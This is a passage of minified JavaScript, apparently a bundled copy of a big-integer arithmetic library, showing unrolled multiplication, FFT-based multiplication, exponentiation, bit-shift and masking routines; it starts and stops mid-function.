                $ = $ + Math.imul(Ve, rt) | 0,
                ie = Math.imul(Ve, dt),
                re = re + Math.imul(Ze, ft) | 0,
                $ = $ + Math.imul(Ze, gt) | 0,
                $ = $ + Math.imul($e, ft) | 0,
                ie = ie + Math.imul($e, gt) | 0,
                re = re + Math.imul(Ie, Ct) | 0,
                $ = $ + Math.imul(Ie, Ot) | 0,
                $ = $ + Math.imul(Te, Ct) | 0,
                ie = ie + Math.imul(Te, Ot) | 0,
                re = re + Math.imul(ge, Pt) | 0,
                $ = $ + Math.imul(ge, Bt) | 0,
                $ = $ + Math.imul(Re, Pt) | 0,
                ie = ie + Math.imul(Re, Bt) | 0;
                var or = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (or >>> 26) | 0,
                or &= 67108863,
                re = Math.imul(nt, rt),
                $ = Math.imul(nt, dt),
                $ = $ + Math.imul(je, rt) | 0,
                ie = Math.imul(je, dt),
                re = re + Math.imul(qe, ft) | 0,
                $ = $ + Math.imul(qe, gt) | 0,
                $ = $ + Math.imul(Ve, ft) | 0,
                ie = ie + Math.imul(Ve, gt) | 0,
                re = re + Math.imul(Ze, Ct) | 0,
                $ = $ + Math.imul(Ze, Ot) | 0,
                $ = $ + Math.imul($e, Ct) | 0,
                ie = ie + Math.imul($e, Ot) | 0,
                re = re + Math.imul(Ie, Pt) | 0,
                $ = $ + Math.imul(Ie, Bt) | 0,
                $ = $ + Math.imul(Te, Pt) | 0,
                ie = ie + Math.imul(Te, Bt) | 0,
                re = re + Math.imul(ge, Dt) | 0,
                $ = $ + Math.imul(ge, Ft) | 0,
                $ = $ + Math.imul(Re, Dt) | 0,
                ie = ie + Math.imul(Re, Ft) | 0;
                var yr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (yr >>> 26) | 0,
                yr &= 67108863,
                re = Math.imul(Qe, rt),
                $ = Math.imul(Qe, dt),
                $ = $ + Math.imul(We, rt) | 0,
                ie = Math.imul(We, dt),
                re = re + Math.imul(nt, ft) | 0,
                $ = $ + Math.imul(nt, gt) | 0,
                $ = $ + Math.imul(je, ft) | 0,
                ie = ie + Math.imul(je, gt) | 0,
                re = re + Math.imul(qe, Ct) | 0,
                $ = $ + Math.imul(qe, Ot) | 0,
                $ = $ + Math.imul(Ve, Ct) | 0,
                ie = ie + Math.imul(Ve, Ot) | 0,
                re = re + Math.imul(Ze, Pt) | 0,
                $ = $ + Math.imul(Ze, Bt) | 0,
                $ = $ + Math.imul($e, Pt) | 0,
                ie = ie + Math.imul($e, Bt) | 0,
                re = re + Math.imul(Ie, Dt) | 0,
                $ = $ + Math.imul(Ie, Ft) | 0,
                $ = $ + Math.imul(Te, Dt) | 0,
                ie = ie + Math.imul(Te, Ft) | 0,
                re = re + Math.imul(ge, at) | 0,
                $ = $ + Math.imul(ge, ze) | 0,
                $ = $ + Math.imul(Re, at) | 0,
                ie = ie + Math.imul(Re, ze) | 0;
                var vr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (vr >>> 26) | 0,
                vr &= 67108863,
                re = Math.imul(ct, rt),
                $ = Math.imul(ct, dt),
                $ = $ + Math.imul(vt, rt) | 0,
                ie = Math.imul(vt, dt),
                re = re + Math.imul(Qe, ft) | 0,
                $ = $ + Math.imul(Qe, gt) | 0,
                $ = $ + Math.imul(We, ft) | 0,
                ie = ie + Math.imul(We, gt) | 0,
                re = re + Math.imul(nt, Ct) | 0,
                $ = $ + Math.imul(nt, Ot) | 0,
                $ = $ + Math.imul(je, Ct) | 0,
                ie = ie + Math.imul(je, Ot) | 0,
                re = re + Math.imul(qe, Pt) | 0,
                $ = $ + Math.imul(qe, Bt) | 0,
                $ = $ + Math.imul(Ve, Pt) | 0,
                ie = ie + Math.imul(Ve, Bt) | 0,
                re = re + Math.imul(Ze, Dt) | 0,
                $ = $ + Math.imul(Ze, Ft) | 0,
                $ = $ + Math.imul($e, Dt) | 0,
                ie = ie + Math.imul($e, Ft) | 0,
                re = re + Math.imul(Ie, at) | 0,
                $ = $ + Math.imul(Ie, ze) | 0,
                $ = $ + Math.imul(Te, at) | 0,
                ie = ie + Math.imul(Te, ze) | 0,
                re = re + Math.imul(ge, ht) | 0,
                $ = $ + Math.imul(ge, _t) | 0,
                $ = $ + Math.imul(Re, ht) | 0,
                ie = ie + Math.imul(Re, _t) | 0;
                var gr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (gr >>> 26) | 0,
                gr &= 67108863,
                re = Math.imul(_e, rt),
                $ = Math.imul(_e, dt),
                $ = $ + Math.imul(Ce, rt) | 0,
                ie = Math.imul(Ce, dt),
                re = re + Math.imul(ct, ft) | 0,
                $ = $ + Math.imul(ct, gt) | 0,
                $ = $ + Math.imul(vt, ft) | 0,
                ie = ie + Math.imul(vt, gt) | 0,
                re = re + Math.imul(Qe, Ct) | 0,
                $ = $ + Math.imul(Qe, Ot) | 0,
                $ = $ + Math.imul(We, Ct) | 0,
                ie = ie + Math.imul(We, Ot) | 0,
                re = re + Math.imul(nt, Pt) | 0,
                $ = $ + Math.imul(nt, Bt) | 0,
                $ = $ + Math.imul(je, Pt) | 0,
                ie = ie + Math.imul(je, Bt) | 0,
                re = re + Math.imul(qe, Dt) | 0,
                $ = $ + Math.imul(qe, Ft) | 0,
                $ = $ + Math.imul(Ve, Dt) | 0,
                ie = ie + Math.imul(Ve, Ft) | 0,
                re = re + Math.imul(Ze, at) | 0,
                $ = $ + Math.imul(Ze, ze) | 0,
                $ = $ + Math.imul($e, at) | 0,
                ie = ie + Math.imul($e, ze) | 0,
                re = re + Math.imul(Ie, ht) | 0,
                $ = $ + Math.imul(Ie, _t) | 0,
                $ = $ + Math.imul(Te, ht) | 0,
                ie = ie + Math.imul(Te, _t) | 0,
                re = re + Math.imul(ge, Ye) | 0,
                $ = $ + Math.imul(ge, it) | 0,
                $ = $ + Math.imul(Re, Ye) | 0,
                ie = ie + Math.imul(Re, it) | 0;
                var Sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Sr >>> 26) | 0,
                Sr &= 67108863,
                re = Math.imul(et, rt),
                $ = Math.imul(et, dt),
                $ = $ + Math.imul(tt, rt) | 0,
                ie = Math.imul(tt, dt),
                re = re + Math.imul(_e, ft) | 0,
                $ = $ + Math.imul(_e, gt) | 0,
                $ = $ + Math.imul(Ce, ft) | 0,
                ie = ie + Math.imul(Ce, gt) | 0,
                re = re + Math.imul(ct, Ct) | 0,
                $ = $ + Math.imul(ct, Ot) | 0,
                $ = $ + Math.imul(vt, Ct) | 0,
                ie = ie + Math.imul(vt, Ot) | 0,
                re = re + Math.imul(Qe, Pt) | 0,
                $ = $ + Math.imul(Qe, Bt) | 0,
                $ = $ + Math.imul(We, Pt) | 0,
                ie = ie + Math.imul(We, Bt) | 0,
                re = re + Math.imul(nt, Dt) | 0,
                $ = $ + Math.imul(nt, Ft) | 0,
                $ = $ + Math.imul(je, Dt) | 0,
                ie = ie + Math.imul(je, Ft) | 0,
                re = re + Math.imul(qe, at) | 0,
                $ = $ + Math.imul(qe, ze) | 0,
                $ = $ + Math.imul(Ve, at) | 0,
                ie = ie + Math.imul(Ve, ze) | 0,
                re = re + Math.imul(Ze, ht) | 0,
                $ = $ + Math.imul(Ze, _t) | 0,
                $ = $ + Math.imul($e, ht) | 0,
                ie = ie + Math.imul($e, _t) | 0,
                re = re + Math.imul(Ie, Ye) | 0,
                $ = $ + Math.imul(Ie, it) | 0,
                $ = $ + Math.imul(Te, Ye) | 0,
                ie = ie + Math.imul(Te, it) | 0,
                re = re + Math.imul(ge, ut) | 0,
                $ = $ + Math.imul(ge, wt) | 0,
                $ = $ + Math.imul(Re, ut) | 0,
                ie = ie + Math.imul(Re, wt) | 0;
                var br = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (br >>> 26) | 0,
                br &= 67108863,
                re = Math.imul(ke, rt),
                $ = Math.imul(ke, dt),
                $ = $ + Math.imul(Me, rt) | 0,
                ie = Math.imul(Me, dt),
                re = re + Math.imul(et, ft) | 0,
                $ = $ + Math.imul(et, gt) | 0,
                $ = $ + Math.imul(tt, ft) | 0,
                ie = ie + Math.imul(tt, gt) | 0,
                re = re + Math.imul(_e, Ct) | 0,
                $ = $ + Math.imul(_e, Ot) | 0,
                $ = $ + Math.imul(Ce, Ct) | 0,
                ie = ie + Math.imul(Ce, Ot) | 0,
                re = re + Math.imul(ct, Pt) | 0,
                $ = $ + Math.imul(ct, Bt) | 0,
                $ = $ + Math.imul(vt, Pt) | 0,
                ie = ie + Math.imul(vt, Bt) | 0,
                re = re + Math.imul(Qe, Dt) | 0,
                $ = $ + Math.imul(Qe, Ft) | 0,
                $ = $ + Math.imul(We, Dt) | 0,
                ie = ie + Math.imul(We, Ft) | 0,
                re = re + Math.imul(nt, at) | 0,
                $ = $ + Math.imul(nt, ze) | 0,
                $ = $ + Math.imul(je, at) | 0,
                ie = ie + Math.imul(je, ze) | 0,
                re = re + Math.imul(qe, ht) | 0,
                $ = $ + Math.imul(qe, _t) | 0,
                $ = $ + Math.imul(Ve, ht) | 0,
                ie = ie + Math.imul(Ve, _t) | 0,
                re = re + Math.imul(Ze, Ye) | 0,
                $ = $ + Math.imul(Ze, it) | 0,
                $ = $ + Math.imul($e, Ye) | 0,
                ie = ie + Math.imul($e, it) | 0,
                re = re + Math.imul(Ie, ut) | 0,
                $ = $ + Math.imul(Ie, wt) | 0,
                $ = $ + Math.imul(Te, ut) | 0,
                ie = ie + Math.imul(Te, wt) | 0,
                re = re + Math.imul(ge, St) | 0,
                $ = $ + Math.imul(ge, Tt) | 0,
                $ = $ + Math.imul(Re, St) | 0,
                ie = ie + Math.imul(Re, Tt) | 0;
                var _r = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (_r >>> 26) | 0,
                _r &= 67108863,
                re = Math.imul(ke, ft),
                $ = Math.imul(ke, gt),
                $ = $ + Math.imul(Me, ft) | 0,
                ie = Math.imul(Me, gt),
                re = re + Math.imul(et, Ct) | 0,
                $ = $ + Math.imul(et, Ot) | 0,
                $ = $ + Math.imul(tt, Ct) | 0,
                ie = ie + Math.imul(tt, Ot) | 0,
                re = re + Math.imul(_e, Pt) | 0,
                $ = $ + Math.imul(_e, Bt) | 0,
                $ = $ + Math.imul(Ce, Pt) | 0,
                ie = ie + Math.imul(Ce, Bt) | 0,
                re = re + Math.imul(ct, Dt) | 0,
                $ = $ + Math.imul(ct, Ft) | 0,
                $ = $ + Math.imul(vt, Dt) | 0,
                ie = ie + Math.imul(vt, Ft) | 0,
                re = re + Math.imul(Qe, at) | 0,
                $ = $ + Math.imul(Qe, ze) | 0,
                $ = $ + Math.imul(We, at) | 0,
                ie = ie + Math.imul(We, ze) | 0,
                re = re + Math.imul(nt, ht) | 0,
                $ = $ + Math.imul(nt, _t) | 0,
                $ = $ + Math.imul(je, ht) | 0,
                ie = ie + Math.imul(je, _t) | 0,
                re = re + Math.imul(qe, Ye) | 0,
                $ = $ + Math.imul(qe, it) | 0,
                $ = $ + Math.imul(Ve, Ye) | 0,
                ie = ie + Math.imul(Ve, it) | 0,
                re = re + Math.imul(Ze, ut) | 0,
                $ = $ + Math.imul(Ze, wt) | 0,
                $ = $ + Math.imul($e, ut) | 0,
                ie = ie + Math.imul($e, wt) | 0,
                re = re + Math.imul(Ie, St) | 0,
                $ = $ + Math.imul(Ie, Tt) | 0,
                $ = $ + Math.imul(Te, St) | 0,
                ie = ie + Math.imul(Te, Tt) | 0;
                var wr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (wr >>> 26) | 0,
                wr &= 67108863,
                re = Math.imul(ke, Ct),
                $ = Math.imul(ke, Ot),
                $ = $ + Math.imul(Me, Ct) | 0,
                ie = Math.imul(Me, Ot),
                re = re + Math.imul(et, Pt) | 0,
                $ = $ + Math.imul(et, Bt) | 0,
                $ = $ + Math.imul(tt, Pt) | 0,
                ie = ie + Math.imul(tt, Bt) | 0,
                re = re + Math.imul(_e, Dt) | 0,
                $ = $ + Math.imul(_e, Ft) | 0,
                $ = $ + Math.imul(Ce, Dt) | 0,
                ie = ie + Math.imul(Ce, Ft) | 0,
                re = re + Math.imul(ct, at) | 0,
                $ = $ + Math.imul(ct, ze) | 0,
                $ = $ + Math.imul(vt, at) | 0,
                ie = ie + Math.imul(vt, ze) | 0,
                re = re + Math.imul(Qe, ht) | 0,
                $ = $ + Math.imul(Qe, _t) | 0,
                $ = $ + Math.imul(We, ht) | 0,
                ie = ie + Math.imul(We, _t) | 0,
                re = re + Math.imul(nt, Ye) | 0,
                $ = $ + Math.imul(nt, it) | 0,
                $ = $ + Math.imul(je, Ye) | 0,
                ie = ie + Math.imul(je, it) | 0,
                re = re + Math.imul(qe, ut) | 0,
                $ = $ + Math.imul(qe, wt) | 0,
                $ = $ + Math.imul(Ve, ut) | 0,
                ie = ie + Math.imul(Ve, wt) | 0,
                re = re + Math.imul(Ze, St) | 0,
                $ = $ + Math.imul(Ze, Tt) | 0,
                $ = $ + Math.imul($e, St) | 0,
                ie = ie + Math.imul($e, Tt) | 0;
                var sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (sr >>> 26) | 0,
                sr &= 67108863,
                re = Math.imul(ke, Pt),
                $ = Math.imul(ke, Bt),
                $ = $ + Math.imul(Me, Pt) | 0,
                ie = Math.imul(Me, Bt),
                re = re + Math.imul(et, Dt) | 0,
                $ = $ + Math.imul(et, Ft) | 0,
                $ = $ + Math.imul(tt, Dt) | 0,
                ie = ie + Math.imul(tt, Ft) | 0,
                re = re + Math.imul(_e, at) | 0,
                $ = $ + Math.imul(_e, ze) | 0,
                $ = $ + Math.imul(Ce, at) | 0,
                ie = ie + Math.imul(Ce, ze) | 0,
                re = re + Math.imul(ct, ht) | 0,
                $ = $ + Math.imul(ct, _t) | 0,
                $ = $ + Math.imul(vt, ht) | 0,
                ie = ie + Math.imul(vt, _t) | 0,
                re = re + Math.imul(Qe, Ye) | 0,
                $ = $ + Math.imul(Qe, it) | 0,
                $ = $ + Math.imul(We, Ye) | 0,
                ie = ie + Math.imul(We, it) | 0,
                re = re + Math.imul(nt, ut) | 0,
                $ = $ + Math.imul(nt, wt) | 0,
                $ = $ + Math.imul(je, ut) | 0,
                ie = ie + Math.imul(je, wt) | 0,
                re = re + Math.imul(qe, St) | 0,
                $ = $ + Math.imul(qe, Tt) | 0,
                $ = $ + Math.imul(Ve, St) | 0,
                ie = ie + Math.imul(Ve, Tt) | 0;
                var dr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (dr >>> 26) | 0,
                dr &= 67108863,
                re = Math.imul(ke, Dt),
                $ = Math.imul(ke, Ft),
                $ = $ + Math.imul(Me, Dt) | 0,
                ie = Math.imul(Me, Ft),
                re = re + Math.imul(et, at) | 0,
                $ = $ + Math.imul(et, ze) | 0,
                $ = $ + Math.imul(tt, at) | 0,
                ie = ie + Math.imul(tt, ze) | 0,
                re = re + Math.imul(_e, ht) | 0,
                $ = $ + Math.imul(_e, _t) | 0,
                $ = $ + Math.imul(Ce, ht) | 0,
                ie = ie + Math.imul(Ce, _t) | 0,
                re = re + Math.imul(ct, Ye) | 0,
                $ = $ + Math.imul(ct, it) | 0,
                $ = $ + Math.imul(vt, Ye) | 0,
                ie = ie + Math.imul(vt, it) | 0,
                re = re + Math.imul(Qe, ut) | 0,
                $ = $ + Math.imul(Qe, wt) | 0,
                $ = $ + Math.imul(We, ut) | 0,
                ie = ie + Math.imul(We, wt) | 0,
                re = re + Math.imul(nt, St) | 0,
                $ = $ + Math.imul(nt, Tt) | 0,
                $ = $ + Math.imul(je, St) | 0,
                ie = ie + Math.imul(je, Tt) | 0;
                var nr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (nr >>> 26) | 0,
                nr &= 67108863,
                re = Math.imul(ke, at),
                $ = Math.imul(ke, ze),
                $ = $ + Math.imul(Me, at) | 0,
                ie = Math.imul(Me, ze),
                re = re + Math.imul(et, ht) | 0,
                $ = $ + Math.imul(et, _t) | 0,
                $ = $ + Math.imul(tt, ht) | 0,
                ie = ie + Math.imul(tt, _t) | 0,
                re = re + Math.imul(_e, Ye) | 0,
                $ = $ + Math.imul(_e, it) | 0,
                $ = $ + Math.imul(Ce, Ye) | 0,
                ie = ie + Math.imul(Ce, it) | 0,
                re = re + Math.imul(ct, ut) | 0,
                $ = $ + Math.imul(ct, wt) | 0,
                $ = $ + Math.imul(vt, ut) | 0,
                ie = ie + Math.imul(vt, wt) | 0,
                re = re + Math.imul(Qe, St) | 0,
                $ = $ + Math.imul(Qe, Tt) | 0,
                $ = $ + Math.imul(We, St) | 0,
                ie = ie + Math.imul(We, Tt) | 0;
                var lr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (lr >>> 26) | 0,
                lr &= 67108863,
                re = Math.imul(ke, ht),
                $ = Math.imul(ke, _t),
                $ = $ + Math.imul(Me, ht) | 0,
                ie = Math.imul(Me, _t),
                re = re + Math.imul(et, Ye) | 0,
                $ = $ + Math.imul(et, it) | 0,
                $ = $ + Math.imul(tt, Ye) | 0,
                ie = ie + Math.imul(tt, it) | 0,
                re = re + Math.imul(_e, ut) | 0,
                $ = $ + Math.imul(_e, wt) | 0,
                $ = $ + Math.imul(Ce, ut) | 0,
                ie = ie + Math.imul(Ce, wt) | 0,
                re = re + Math.imul(ct, St) | 0,
                $ = $ + Math.imul(ct, Tt) | 0,
                $ = $ + Math.imul(vt, St) | 0,
                ie = ie + Math.imul(vt, Tt) | 0;
                var fr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (fr >>> 26) | 0,
                fr &= 67108863,
                re = Math.imul(ke, Ye),
                $ = Math.imul(ke, it),
                $ = $ + Math.imul(Me, Ye) | 0,
                ie = Math.imul(Me, it),
                re = re + Math.imul(et, ut) | 0,
                $ = $ + Math.imul(et, wt) | 0,
                $ = $ + Math.imul(tt, ut) | 0,
                ie = ie + Math.imul(tt, wt) | 0,
                re = re + Math.imul(_e, St) | 0,
                $ = $ + Math.imul(_e, Tt) | 0,
                $ = $ + Math.imul(Ce, St) | 0,
                ie = ie + Math.imul(Ce, Tt) | 0;
                var ir = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (ir >>> 26) | 0,
                ir &= 67108863,
                re = Math.imul(ke, ut),
                $ = Math.imul(ke, wt),
                $ = $ + Math.imul(Me, ut) | 0,
                ie = Math.imul(Me, wt),
                re = re + Math.imul(et, St) | 0,
                $ = $ + Math.imul(et, Tt) | 0,
                $ = $ + Math.imul(tt, St) | 0,
                ie = ie + Math.imul(tt, Tt) | 0;
                var $t = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + ($t >>> 26) | 0,
                $t &= 67108863,
                re = Math.imul(ke, St),
                $ = Math.imul(ke, Tt),
                $ = $ + Math.imul(Me, St) | 0,
                ie = Math.imul(Me, Tt);
                var Nt = (de + re | 0) + (($ & 8191) << 13) | 0;
                return de = (ie + ($ >>> 13) | 0) + (Nt >>> 26) | 0,
                Nt &= 67108863,
                se[0] = er,
                se[1] = Xt,
                se[2] = pr,
                se[3] = or,
                se[4] = yr,
                se[5] = vr,
                se[6] = gr,
                se[7] = Sr,
                se[8] = br,
                se[9] = _r,
                se[10] = wr,
                se[11] = sr,
                se[12] = dr,
                se[13] = nr,
                se[14] = lr,
                se[15] = fr,
                se[16] = ir,
                se[17] = $t,
                se[18] = Nt,
                de !== 0 && (se[19] = de,
                U.length++),
                U
            };
            Math.imul || (ne = ae);
            function oe(ce, q, L) {
                L.negative = q.negative ^ ce.negative,
                L.length = ce.length + q.length;
                for (var U = 0, Z = 0, te = 0; te < L.length - 1; te++) {
                    var se = Z;
                    Z = 0;
                    for (var de = U & 67108863, re = Math.min(te, q.length - 1), $ = Math.max(0, te - ce.length + 1); $ <= re; $++) {
                        var ie = te - $
                          , ve = ce.words[ie] | 0
                          , ge = q.words[$] | 0
                          , Re = ve * ge
                          , Pe = Re & 67108863;
                        se = se + (Re / 67108864 | 0) | 0,
                        Pe = Pe + de | 0,
                        de = Pe & 67108863,
                        se = se + (Pe >>> 26) | 0,
                        Z += se >>> 26,
                        se &= 67108863
                    }
                    L.words[te] = de,
                    U = se,
                    se = Z
                }
                return U !== 0 ? L.words[te] = U : L.length--,
                L.strip()
            }
            function ue(ce, q, L) {
                var U = new fe;
                return U.mulp(ce, q, L)
            }
            w.prototype.mulTo = function(q, L) {
                var U, Z = this.length + q.length;
                return this.length === 10 && q.length === 10 ? U = ne(this, q, L) : Z < 63 ? U = ae(this, q, L) : Z < 1024 ? U = oe(this, q, L) : U = ue(this, q, L),
                U
            }
            ;
            function fe(ce, q) {
                this.x = ce,
                this.y = q
            }
            fe.prototype.makeRBT = function(q) {
                for (var L = new Array(q), U = w.prototype._countBits(q) - 1, Z = 0; Z < q; Z++)
                    L[Z] = this.revBin(Z, U, q);
                return L
            }
            ,
            fe.prototype.revBin = function(q, L, U) {
                if (q === 0 || q === U - 1)
                    return q;
                for (var Z = 0, te = 0; te < L; te++)
                    Z |= (q & 1) << L - te - 1,
                    q >>= 1;
                return Z
            }
            ,
            fe.prototype.permute = function(q, L, U, Z, te, se) {
                for (var de = 0; de < se; de++)
                    Z[de] = L[q[de]],
                    te[de] = U[q[de]]
            }
            ,
            fe.prototype.transform = function(q, L, U, Z, te, se) {
                this.permute(se, q, L, U, Z, te);
                for (var de = 1; de < te; de <<= 1)
                    for (var re = de << 1, $ = Math.cos(2 * Math.PI / re), ie = Math.sin(2 * Math.PI / re), ve = 0; ve < te; ve += re)
                        for (var ge = $, Re = ie, Pe = 0; Pe < de; Pe++) {
                            var Ie = U[ve + Pe]
                              , Te = Z[ve + Pe]
                              , Le = U[ve + Pe + de]
                              , Ze = Z[ve + Pe + de]
                              , $e = ge * Le - Re * Ze;
                            Ze = ge * Ze + Re * Le,
                            Le = $e,
                            U[ve + Pe] = Ie + Le,
                            Z[ve + Pe] = Te + Ze,
                            U[ve + Pe + de] = Ie - Le,
                            Z[ve + Pe + de] = Te - Ze,
                            Pe !== re && ($e = $ * ge - ie * Re,
                            Re = $ * Re + ie * ge,
                            ge = $e)
                        }
            }
            ,
            fe.prototype.guessLen13b = function(q, L) {
                var U = Math.max(L, q) | 1
                  , Z = U & 1
                  , te = 0;
                for (U = U / 2 | 0; U; U = U >>> 1)
                    te++;
                return 1 << te + 1 + Z
            }
            ,
            fe.prototype.conjugate = function(q, L, U) {
                if (!(U <= 1))
                    for (var Z = 0; Z < U / 2; Z++) {
                        var te = q[Z];
                        q[Z] = q[U - Z - 1],
                        q[U - Z - 1] = te,
                        te = L[Z],
                        L[Z] = -L[U - Z - 1],
                        L[U - Z - 1] = -te
                    }
            }
            ,
            fe.prototype.normalize13b = function(q, L) {
                for (var U = 0, Z = 0; Z < L / 2; Z++) {
                    var te = Math.round(q[2 * Z + 1] / L) * 8192 + Math.round(q[2 * Z] / L) + U;
                    q[Z] = te & 67108863,
                    te < 67108864 ? U = 0 : U = te / 67108864 | 0
                }
                return q
            }
            ,
            fe.prototype.convert13b = function(q, L, U, Z) {
                for (var te = 0, se = 0; se < L; se++)
                    te = te + (q[se] | 0),
                    U[2 * se] = te & 8191,
                    te = te >>> 13,
                    U[2 * se + 1] = te & 8191,
                    te = te >>> 13;
                for (se = 2 * L; se < Z; ++se)
                    U[se] = 0;
                O(te === 0),
                O((te & -8192) === 0)
            }
            ,
            fe.prototype.stub = function(q) {
                for (var L = new Array(q), U = 0; U < q; U++)
                    L[U] = 0;
                return L
            }
            ,
            fe.prototype.mulp = function(q, L, U) {
                var Z = 2 * this.guessLen13b(q.length, L.length)
                  , te = this.makeRBT(Z)
                  , se = this.stub(Z)
                  , de = new Array(Z)
                  , re = new Array(Z)
                  , $ = new Array(Z)
                  , ie = new Array(Z)
                  , ve = new Array(Z)
                  , ge = new Array(Z)
                  , Re = U.words;
                Re.length = Z,
                this.convert13b(q.words, q.length, de, Z),
                this.convert13b(L.words, L.length, ie, Z),
                this.transform(de, se, re, $, Z, te),
                this.transform(ie, se, ve, ge, Z, te);
                for (var Pe = 0; Pe < Z; Pe++) {
                    var Ie = re[Pe] * ve[Pe] - $[Pe] * ge[Pe];
                    $[Pe] = re[Pe] * ge[Pe] + $[Pe] * ve[Pe],
                    re[Pe] = Ie
                }
                return this.conjugate(re, $, Z),
                this.transform(re, $, Re, se, Z, te),
                this.conjugate(Re, se, Z),
                this.normalize13b(Re, Z),
                U.negative = q.negative ^ L.negative,
                U.length = q.length + L.length,
                U.strip()
            }
            ,
            w.prototype.mul = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                this.mulTo(q, L)
            }
            ,
            w.prototype.mulf = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                ue(this, q, L)
            }
            ,
            w.prototype.imul = function(q) {
                return this.clone().mulTo(q, this)
            }
            ,
            w.prototype.imuln = function(q) {
                O(typeof q == "number"),
                O(q < 67108864);
                for (var L = 0, U = 0; U < this.length; U++) {
                    var Z = (this.words[U] | 0) * q
                      , te = (Z & 67108863) + (L & 67108863);
                    L >>= 26,
                    L += Z / 67108864 | 0,
                    L += te >>> 26,
                    this.words[U] = te & 67108863
                }
                return L !== 0 && (this.words[U] = L,
                this.length++),
                this.length = q === 0 ? 1 : this.length,
                this
            }
            ,
            w.prototype.muln = function(q) {
                return this.clone().imuln(q)
            }
            ,
            w.prototype.sqr = function() {
                return this.mul(this)
            }
            ,
            w.prototype.isqr = function() {
                return this.imul(this.clone())
            }
            ,
            w.prototype.pow = function(q) {
                var L = ee(q);
                if (L.length === 0)
                    return new w(1);
                for (var U = this, Z = 0; Z < L.length && L[Z] === 0; Z++,
                U = U.sqr())
                    ;
                if (++Z < L.length)
                    for (var te = U.sqr(); Z < L.length; Z++,
                    te = te.sqr())
                        L[Z] !== 0 && (U = U.mul(te));
                return U
            }
            ,
            w.prototype.iushln = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26, U = (q - L) / 26, Z = 67108863 >>> 26 - L << 26 - L, te;
                if (L !== 0) {
                    var se = 0;
                    for (te = 0; te < this.length; te++) {
                        var de = this.words[te] & Z
                          , re = (this.words[te] | 0) - de << L;
                        this.words[te] = re | se,
                        se = de >>> 26 - L
                    }
                    se && (this.words[te] = se,
                    this.length++)
                }
                if (U !== 0) {
                    for (te = this.length - 1; te >= 0; te--)
                        this.words[te + U] = this.words[te];
                    for (te = 0; te < U; te++)
                        this.words[te] = 0;
                    this.length += U
                }
                return this.strip()
            }
            ,
            w.prototype.ishln = function(q) {
                return O(this.negative === 0),
                this.iushln(q)
            }
            ,
            w.prototype.iushrn = function(q, L, U) {
                O(typeof q == "number" && q >= 0);
                var Z;
                L ? Z = (L - L % 26) / 26 : Z = 0;
                var te = q % 26
                  , se = Math.min((q - te) / 26, this.length)
                  , de = 67108863 ^ 67108863 >>> te << te
                  , re = U;
                if (Z -= se,
                Z = Math.max(0, Z),
                re) {
                    for (var $ = 0; $ < se; $++)
                        re.words[$] = this.words[$];
                    re.length = se
                }
                if (se !== 0)
                    if (this.length > se)
                        for (this.length -= se,
                        $ = 0; $ < this.length; $++)
                            this.words[$] = this.words[$ + se];
                    else
                        this.words[0] = 0,
                        this.length = 1;
                var ie = 0;
                for ($ = this.length - 1; $ >= 0 && (ie !== 0 || $ >= Z); $--) {
                    var ve = this.words[$] | 0;
                    this.words[$] = ie << 26 - te | ve >>> te,
                    ie = ve & de
                }
                return re && ie !== 0 && (re.words[re.length++] = ie),
                this.length === 0 && (this.words[0] = 0,
                this.length = 1),
                this.strip()
            }
            ,
            w.prototype.ishrn = function(q, L, U) {
                return O(this.negative === 0),
                this.iushrn(q, L, U)
            }
            ,
            w.prototype.shln = function(q) {
                return this.clone().ishln(q)
            }
            ,
            w.prototype.ushln = function(q) {
                return this.clone().iushln(q)
            }
            ,
            w.prototype.shrn = function(q) {
                return this.clone().ishrn(q)
            }
            ,
            w.prototype.ushrn = function(q) {
                return this.clone().iushrn(q)
            }
            ,
            w.prototype.testn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return !1;
                var te = this.words[U];
                return !!(te & Z)
            }
            ,
            w.prototype.imaskn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26;
                if (O(this.negative === 0, "imaskn works only with positive numbers"),
                this.length <= U)
                    return this;
                if (L !== 0 && U++,
                this.length = Math.min(U, this.length),
                L !== 0) {
                    var Z = 67108863 ^ 67108863 >>> L << L;
                    this.words[this.length - 1] &= Z
                }
                return this.strip()
            }
            ,
            w.prototype.maskn = function(q) {
                return this.clone().imaskn(q)
            }
            ,
            w.prototype.iaddn = function(q) {
                return O(typeof q == "number"),
                O(q < 67108864),
                q < 0 ? this.isubn(-q) : this.negative !== 0 ? this.length === 1 && (this.words[0] | 0) < q ? (this.words[0] = q - (this.words[0] | 0),
                this.negative = 0,
                this) : (this.negative = 0,
                this.isubn(q),
                this.negative = 1,
                this) : this._iaddn(q)
            }
            ,
            w.prototype._iaddn = function(q) {
                this.words[0] += q;
                for (var L = 0; L < this.length && this.words[L] >= 67108864; L++)
                    this.words[L] -= 67108864,
